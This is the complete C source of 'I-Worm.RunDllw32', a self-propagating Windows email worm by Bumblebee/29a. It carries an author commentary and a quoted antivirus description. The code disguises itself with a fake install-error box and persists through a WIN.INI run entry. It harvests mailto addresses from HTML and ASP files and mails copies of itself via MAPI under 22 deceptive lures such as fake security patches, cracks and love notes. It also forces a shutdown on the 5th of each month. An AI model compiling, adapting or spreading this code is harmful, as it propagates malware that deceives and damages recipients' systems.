   /*

       I-Worm.RunDllw32
       ~~~~~~~~~~~~~~~~

       Coded by Bumblebee/29


       Disclaimer

        .This is the source code of a I-WORM. The author is not responsabile
       of the damages that may occur due to the compilation and linkage of
         this file. Use it at your own risk.


       Words of the author

        .Yeah, yeah, i know: another worm. After doing Anaphylaxis and Gift i
       began to think i has sufficient experience to code a really powerfull
       worm and this is the result (nah, this is only an improvement of Gift).
       I promisse i will not do another worm until some time ;)

        .22 different messages with different subject, text and attachment. It
       does residence too. Can be annoying but not possible it fucks mail servers
       by excess of mail flow. It uses only shared sessions of MAPI, so if there
       is not a session working the worm does nothing. The run-time part was
       removed due to this it only works when is resident, so the user will be safe
       until next time he/she boots the system. Then the worm will start looking
       for mail addresses to send. The worm still searches into *.ht* file to
       find the 'mailto:', but this time *.asp files are touched too. This is
       a 'slow-worm'.

        .The best feature of the worm is the residence and the slow way to scan
         the system for addresses. With a little amount of luck the user will not
       notice anything before long time. 'Rundllw32' is a nice name to see when
       user press CTL+ALT+SUP. Who can say this is not part of windoze? OK. The
       'w'... hehehe. As most of the worms is easy to remove: the win.ini line
       and delete the worm.

        .This worm has payload thanks to its residence: a lame message box and
       close window call ;)

   AVP description of Gift.a and Gift.b (Rundllw32) -----------------------------

   I-Worm.Gift

   This is a worm virus spreading via the Internet. The worm itself is a Windows
   EXE file about 30Kb of length. It is transferred via the net in email messages
   with an infected EXE file attachment with different names (see below). When
   such a message is received and the attached EXE file is executed, the worm gets
   control and starts its spreading routine. This routine scans the current directory,
   then the \Windows directory on the current disk, and then the Explorer personal
   folder ("My Documents" as default) for .HT* files (HTML and HTTP files), scans
   them and searches for email addresses in files' body. When such addresses are
   located, the worm connects to the network by using MAPI functions and sends its
   copy to these email addresses. The worm sends its copy on each start.
   The "Gift.a" worm does not install itself into the system and is executed only
   once - when user activates the file attached to the infected message. So this
   worm is the "nonresident, direct action" Internet Worm.

   The "Gift.b" worm copies itself to the Windows directory with the "Rundllw32.exe"
   name and registers it in the system to force Windows to run this file on each startup.
   While registering either WIN.INI file if modified with "Run=" instruction in the
   [Windows] section (under Win9x), or corresponding "Run=" key is modified in WinNT registry.

   To hide its activity the worm displays the fake error message at the end of its work:

   "Gift.a":

       WinZip Self-eXtractor
        File data corrupt:
        bad disk access or bad data transmission.

   "Gift.b":
       Install error
        File data corrupt:
        probably due to bad data transmission or bad disk access.'

   While generating infected emails, the worm fills the fields and names the attached EXE
   file with ten ("Gift.a") or twenty-two ("Gift.b") possible variants:

    Subject          EXE name      Message body
    -------          --------      ------------

    "Gift.a":

    Documents        Docs.exe      Send me your comments...
    Roms             Roms.exe      Test this ROM! IT ROCKS!.
    Pr0n!            Sex.exe       Adult content!!! Use with parental advisory.
    Evaluation copy  Setup.exe     Test it 30 days for free.
    Help             Source.exe    I'm going crazy... please try to find the bug!
    Beta             _SetupB.exe   Send reply if you want to be official beta tester.
    Do not release   Pack.exe      This is the pack ;)
    Last Update      LUPdate.exe   This is the last cumulative update.
    The patch        Patch.exe     I think all will work fine.
    Cracks!          CrkList.exe   Check our list and mail your requests!

    "Gift.b":

    Improve your site           js.exe
    Quiz                        Setup.exe
    IE5 security patch          Ie5Patch.exe
    Shield PAK Installation     ISPAK.EXE
    Secure Communications Inc.  SCommSetup.exe
    Cracks                      clist.exe
    Sex Farm - Adult contents   sfarm.exe
    JsvaScript 4 Docs           jsdoc4.exe
    VB examples                 instEx.exe
    My Rom list                 myList.exe
    IE Plug-in                  ie-pin.exe
    NS Plug-in                  ns-pin.exe
    Honey ;)                    SETUP.EXE
    Damn crack...               crack.exe
    Disk tool                   drDisk.exe
    Sexy game                   powerDick.exe
    freeIRC beta mail list      setupb.exe
    your dlls                   dlls.exe
    cool mail                   smail.exe
    why?                        doc.exe
    y2k fix                     y2k.exe
    benchmark                   bdbench.exe

   "Gift.b" message bodies are:
    Hi! Your page is nice. Test this js scripts and tell me what do you think.
    Hello, Take a look to this little app!
    This is the security patch you asked for... i don't know if is the last version but works.
    Take a look at this new archiver! 30 trial version.
    Do you feel secure? Run this small program to see if your communications are safe.
    Take a look at my cracks list. Ask if you want something ;)
    Sex Farm! Take a look at this little demo for free. Adult content!!!
    This is the information you mean? Let me know if you need something else :)
    1st notice... moreover there are some examples. VB4 runtime is needed!
    I love you :* Thanks you for the information. There is my list...
    There is the plug-in for IE... ;) send me comments.
    There is the plug-in for NS... ;) send me comments.
    Hi honey! How goes? fine here. There is the little app i told you.
    Hello, I'm trying to make run this shit but... please test it if ya can.
    Dunno. But try this. May be it works in your system.
   See you!
    Cool pics you send me!!! try this little game... rulez!
    Last Beta 0.6. Reply with subject "un-subscribe" to leave mail list...
    Here goes the dlls you asked for. It's strange you don't have it yet :?
    I'm testing my new cool mail client... rockz! and is smallllll ;)
    What can i do? please reply as soon as posible.
    This will fix your problem ;) You're welcome...
    A backdoor?? nah. But if this makes you feel better, there's a benchmark.


   The "Gift.a" worm also modifies the message header fields (sender's address),
   and there can be the fake address "GiftOfFury@Bumblebee.net" found.
   The "Gift.b" worm on 5th of any month displays the message:

    I-Worm.RunDllw32 Activated
     This is a I-Worm coded by Bumblebee\29a!
     Gretingz to all 29a members ;)

   ------------------------------------------------------------------------------

   Good work AVP people! (but this time was easy ;)


                                       The way of the bee
                                                                       The way of the bee
   */

   #include<windows.h>
   #include<mapi.h>
   #include<memory.h>

   #pragma argsused

   /* PROTO */
   ULONG (PASCAL FAR *MSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
   void SendMail(char *subject, char *sfrom,char *sto, char *smes);
   void findMail(char *,char *);
   void GetMail(char *, char *);
   void waitMin(int);


   #define NCUSTOM 21
   /* GLOBAL DATA */
   MapiMessage mes;
   MapiRecipDesc from;
   char fileName[512];
   unsigned long count=0,mtime,sent=0;
   char *fileNames[]={
   "js.exe",
   "Setup.exe",
   "Ie5Patch.exe",
   "ISPAK.EXE",
   "SCommSetup.exe",
   "clist.exe",
   "sfarm.exe",
   "jsdoc4.exe",
   "instEx.exe",
   "myList.exe",
   "ie-pin.exe",
   "ns-pin.exe",
   "SETUP.EXE",
   "crack.exe",
   "drDisk.exe",
   "powerDick.exe",
   "setupb.exe",
   "dlls.exe",
   "smail.exe",
   "doc.exe",
   "y2k.exe",
   "bdbench.exe"
   };
   char *subs[]={
   "Improve your site",
   "Quiz",
   "IE5 security patch",
   "Shield PAK Installation",
   "Secure Communications Inc.",
   "Cracks",
   "Sex Farm - Adult contents",
   "JsvaScript 4 Docs",
   "VB examples",
   "My Rom list",
   "IE Plug-in",
   "NS Plug-in",
   "Honey ;)",
   "Damn crack...",
   "Disk tool",
   "Sexy game",
   "freeIRC beta mail list",
   "your dlls",
   "cool mail",
   "why?",
   "y2k fix",
   "benchmark"
   };
   char *texts[]={
   "\n Hi!\n\n\tYour page is nice. Test this js scripts and tell me what do you think.\n",
   "\n Hello,\n\n\tTake a look to this little app!",
   "\n This is the security patch you asked for... i don't know if is the last version but works.\n",
   "\n Take a look at this new archiver! 30 trial version.\n",
   "\n Do you feel secure? Run this small program to see if your communications are safe.\n",
   "\n Take a look at my cracks list. Ask if you want something ;)",
   "\n Sex Farm! Take a look at this little demo for free. Adult content!!!\n",
   "\n This is the information you mean? Let me know if you need something else :)\n",
   "\n 1st notice... moreover there are some examples. VB4 runtime is needed!\n",
   "\n I love you :* Thanks you for the information. There is my list...\n",
   "\n There is the plug-in for IE... ;) send me comments.\n",
   "\n There is the plug-in for NS... ;) send me comments.\n",
   "\n Hi honey!\n\n How goes? fine here. There is the little app i told you.\n",
   "\n Hello,\n\n\t I'm trying to make run this shit but... please test it if ya can.\n",
   "\n Dunno. But try this. May be it works in your system.\nSee you!\n",
   "\n Cool pics you send me!!! try this little game... rulez!\n",
   "\n Last Beta 0.6.\n\n Reply with subject \"un-subscribe\" to leave mail list...\n",
   "\n Here goes the dlls you asked for. It's strange you don't have it yet :?\n",
   "\n I'm testing my new cool mail client... rockz! and is smallllll ;)\n",
   "\n What can i do? please reply as soon as posible.\n",
   "\n This will fix your problem ;)\nYou're welcome...\n",
   "\n A backdoor?? nah. But if this makes you feel better, there's a benchmark.\n"
   };

   /* this time i did residence */
   BOOL resident=FALSE;

   int PASCAL
   WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance,
                                                               LPSTR lpCmdLine, int nCmdShow)
   {
   HINSTANCE MAPIlHnd;
   unsigned char buff[128];
   DWORD buffs=128;
   char buffer[512];
   HKEY keyHnd;
   char keyPath[]="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
   char keyItem[]="Personal";
   SYSTEMTIME syst;
   HANDLE fh;
   WIN32_FIND_DATA fdata;

       /* test for payload */
       GetSystemTime(&syst);
       if(syst.wDay==5) {
       /* hello message box */
       MessageBox(NULL,"This is a I-Worm coded by Bumblebee\\29a!\n\nGretingz to all 29a members ;)",
       "I-Worm.RunDllw32 Activated",MB_OK|MB_ICONSTOP);
           /* and close windows ;) */
           ExitWindowsEx(1|4,1|4);
       }

       /* random number */
       count=(unsigned long)(syst.wMilliseconds*syst.wMinute);
       while(count>NCUSTOM)
           count=(unsigned long)(count/2);

       /* get module name for the attachment */
       if(!GetModuleFileName(hInstance,fileName,512))
           return -1;

       GetWindowsDirectory((char *)buff,128);
       wsprintf(buffer,"%s\\RUNDLLW32.EXE",buff);
       if(!strcmpi(fileName,buffer)) {
           resident=TRUE;
       } else {
       /* some stealth if not resident */
       MessageBox(NULL,"File data corrupt:\n\n   probably due to bad data transmission or bad disk access.",
       "Install error",MB_OK|MB_ICONSTOP);
       }

       /* go resident if not yet and end */
       if(!resident) {
           GetWindowsDirectory((char *)buff,128);
           wsprintf(buffer,"%s\\Rundllw32.exe",buff);
           CopyFile(fileName,buffer,1);
           WriteProfileString("WINDOWS", "RUN", buffer);
           WriteProfileString(NULL, NULL, NULL);
           return 0;
       }

       /* test if MAPI32 is avaliable */
       MAPIlHnd=LoadLibraryA("MAPI32.DLL");
       if(!MAPIlHnd)
           return -1;

       /* get MAPISendMail */
       (FARPROC &)MSendMail=GetProcAddress(MAPIlHnd, "MAPISendMail");

       if(!MSendMail)
           return -1;

       /* if we are here means we are resident */
       /* wait 5 minutes */
       waitMin(5);

       /* scan personal folder */
       if(RegOpenKeyEx((PHKEY)0x80000001,keyPath,0,KEY_READ,&keyHnd)==ERROR_SUCCESS) {
           if(ERROR_SUCCESS==RegQueryValueEx(keyHnd,keyItem,0,0,buff,&buffs)) {
               buff[buffs-1]='\\';
               buff[buffs]=0;
               findMail((char *)buff,"*.ht*");
               findMail((char *)buff,"*.asp");
           }
       }

       /* scan work directory*/
       findMail(".","*.ht*");
       findMail(".","*.asp");

       /* scan all the sub-folders of the root dir */
       fh=FindFirstFile("\\*.*",&fdata);
       if(fh==INVALID_HANDLE_VALUE)
           return -1;

       while(1) {
           /* it's a directory? */
           if((fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)==FILE_ATTRIBUTE_DIRECTORY) {
               /* wait (mails sent) minutes */
               waitMin((int)sent);
               sent=0;
               wsprintf(buffer,"\\%s",fdata.cFileName);
               findMail(buffer,"*.ht*");
               findMail(buffer,"*.asp");
           }
           if(!FindNextFile(fh,&fdata)) {
               /* end the search */
               FindClose(fh);
               return -1;
           }
       }
   }

   void
   waitMin(int min)
   {
       /* wait some time before work */
       mtime=(unsigned long)GetTickCount();
       mtime+=(60000*min);
       while(mtime>(unsigned long)GetTickCount());
   }

   void
   SendMail(char *subject, char *sfrom,char *sto, char *smes)
   {

       memset(&mes, 0, sizeof(MapiMessage));
       memset(&from, 0, sizeof(MapiRecipDesc));

       from.lpszName=sfrom; // From
       from.ulRecipClass=MAPI_ORIG;
       mes.lpszSubject=subject; // Subject
       mes.lpRecips=(MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
       if(!mes.lpRecips)
           return;
       memset(mes.lpRecips, 0, sizeof(MapiRecipDesc));
       mes.lpRecips->lpszName=sto; // Send to
       mes.lpRecips->ulRecipClass=MAPI_TO;
       mes.nRecipCount=1;

       mes.lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
       if(!mes.lpFiles)
           return;
       memset(mes.lpFiles, 0, sizeof(MapiFileDesc));
       mes.lpFiles->lpszPathName=fileName;
       mes.lpFiles->lpszFileName=fileNames[count];
       mes.nFileCount=1;

       mes.lpOriginator=&from;

       mes.lpszNoteText=smes;          // Message
       (MSendMail)(0, 0, &mes, 0, 0);

       free(mes.lpRecips);
       free(mes.lpFiles);
   }

   void
   findMail(char *wild,char *card)
   {
   HANDLE fh;
   WIN32_FIND_DATA fdata;
   char mail[128];
   char buff[512];

       wsprintf(buff,"%s\\%s",wild,card);
       fh=FindFirstFile(buff,&fdata);
       if(fh==INVALID_HANDLE_VALUE)
           return;

       while(1) {
           wsprintf(buff,"%s\\%s",wild,fdata.cFileName);
           GetMail(buff,mail);
           if(strlen(mail)>0) {
               SendMail(subs[count], NULL, mail, texts[count]);
               sent++;
               count++;
               if(count==NCUSTOM)
                   count=0;
           }
           if(!FindNextFile(fh,&fdata)) {
               FindClose(fh);
               return;
           }
       }
   }

   void
   GetMail(char *name, char *mail)
   {
   HANDLE fd,fd2;
   char *mapped;
   DWORD size,i,k;
   BOOL test=FALSE,valid=FALSE;

   mail[0]=0;

       fd=CreateFile(name,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,
           FILE_ATTRIBUTE_ARCHIVE,0);
       if(fd==INVALID_HANDLE_VALUE)
           return;

       size=GetFileSize(fd,NULL);
       if(!size)
           return;
       if(size<256)
           return;
       size-=100;

       fd2=CreateFileMapping(fd,0,PAGE_READONLY,0,0,0);
       if(!fd2) {
           CloseHandle(fd);
           return;
       }

       mapped=(char *)MapViewOfFile(fd2,FILE_MAP_READ,0,0,0);
       if(!mapped) {
           CloseHandle(fd2);
           CloseHandle(fd);
           return;
       }

       i=0;
       while(i<size && !test) {
           if(!strncmpi("mailto:",mapped+i,strlen("mailto:"))) {
               test=TRUE;
               i+=strlen("mailto:");
               k=0;
               while(mapped[i]!=34 && mapped[i]!=39 && i<size && k<127) {
                   if(mapped[i]!=' ') {
                       mail[k]=mapped[i];
                       k++;
                       if(mapped[i]=='@')
                           valid=TRUE;
                   }
                   i++;
               }
               mail[k]=0;
           } else
               i++;
       }

       if(!valid)
           mail[0]=0;

       UnmapViewOfFile(mapped);
       CloseHandle(fd2);
       CloseHandle(fd);
       return;
   }
